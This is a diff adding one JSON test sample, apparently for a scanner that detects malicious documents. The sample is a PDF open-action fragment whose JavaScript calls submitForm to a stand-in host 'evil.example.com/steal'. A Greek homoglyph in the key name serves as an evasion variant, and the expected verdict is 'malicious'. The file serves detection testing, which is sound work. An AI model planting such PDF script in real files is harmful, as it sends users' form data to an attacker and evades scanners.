@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-pdf::30::unicode-variations::1",
+  "base_sample_id": "exp::document-pdf::30",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": -292632420,
+  "content": "/ΑA << /O << /S /JavaScript /JS (this.submitForm(\"http://evil.example.com/steal\")) >> >>\n",
+  "content_hash": "c913ec691fc542b75edc7c49d88362a527658066092e7a2b419eb7dd4ddfb5bf",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:greek-homoglyph",
+  "difficulty": "advanced"
+}
